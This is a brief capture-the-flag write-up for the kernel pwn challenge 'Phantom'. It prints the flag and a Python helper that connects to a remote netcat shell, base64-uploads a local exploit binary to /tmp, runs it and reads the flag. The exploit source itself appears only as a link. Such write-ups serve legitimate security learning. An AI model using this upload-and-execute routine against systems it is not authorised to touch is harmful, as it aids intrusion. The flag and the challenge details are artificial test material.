# pwn - Phantom

create c file for exploit

then transfer the file using python script

`python3 push_remote.py chall.0xfun.org 55883 --bin ./build/exploit --remote /tmp/exploit`

FLAG:`0xfun{r34l_k3rn3l_h4ck3rs_d0nt_unzip}`

```python
#!/usr/bin/env python3
import argparse
import base64
import os
import select
import socket
import sys
import time


def eprint(*a):
    print(*a, file=sys.stderr, flush=True)


def recv_some(sock: socket.socket, timeout: float = 0.2) -> bytes:
    r, _, _ = select.select([sock], [], [], timeout)
    if not r:
        return b""
    try:
        return sock.recv(65536)
    except socket.timeout:
        return b""


def recv_until_quiet(sock: socket.socket, quiet_for: float = 0.4, max_total: float = 5.0) -> bytes:
    out = bytearray()
    t_end = time.time() + max_total
    last = time.time()
    while time.time() < t_end:
        chunk = recv_some(sock, timeout=0.2)
        if chunk:
            out += chunk
            last = time.time()
            continue
        if time.time() - last >= quiet_for:
            break
    return bytes(out)


def send_all(sock: socket.socket, data: bytes, chunk: int = 4096, delay: float = 0.002) -> None:
    # Chunked send helps some fragile netcat-backed TTY shims.
    for i in range(0, len(data), chunk):
        sock.sendall(data[i : i + chunk])
        if delay:
            time.sleep(delay)


def wrap_b64(s: str, width: int = 76) -> str:
    return "\n".join(s[i : i + width] for i in range(0, len(s), width))


def main() -> int:
    ap = argparse.ArgumentParser(description="Upload a local binary over an nc shell and run it.")
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--bin", default="tiny_exploit", help="path to local binary to upload")
    ap.add_argument("--remote", default="/tmp/tiny_exploit", help="remote path to write")
    args = ap.parse_args()

    if not os.path.exists(args.bin):
        eprint(f"missing local binary: {args.bin}")
        return 2

    blob = open(args.bin, "rb").read()
    b64 = base64.b64encode(blob).decode("ascii")
    b64_wrapped = wrap_b64(b64)

    script = f"""cd /tmp
rm -f {args.remote} {args.remote}.b64 /tmp/flag
cat > {args.remote}.b64 <<'EOF'
{b64_wrapped}
EOF
base64 -d {args.remote}.b64 > {args.remote}
chmod +x {args.remote}
{args.remote}
cat /tmp/flag 2>/dev/null
"""

    s = socket.create_connection((args.host, args.port), timeout=5.0)
    s.settimeout(1.0)
    try:
        # Drain banner/prompt.
        sys.stdout.buffer.write(recv_until_quiet(s))
        sys.stdout.buffer.flush()

        send_all(s, script.encode("utf-8"))
        # Print everything until the server closes or we go quiet.
        while True:
            out = recv_until_quiet(s, quiet_for=0.8, max_total=15.0)
            if out:
                sys.stdout.buffer.write(out)
                sys.stdout.buffer.flush()
                continue
            break
    finally:
        try:
            s.close()
        except Exception:
            pass

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

## Attachments

- [exploit.c](https://raw.githubusercontent.com/rehackxyz/REUN10N/main/CTF-writeups/2026/0xfun-ctf-2026/assets/phantom-exploit.c)


Solved by: ha1qal
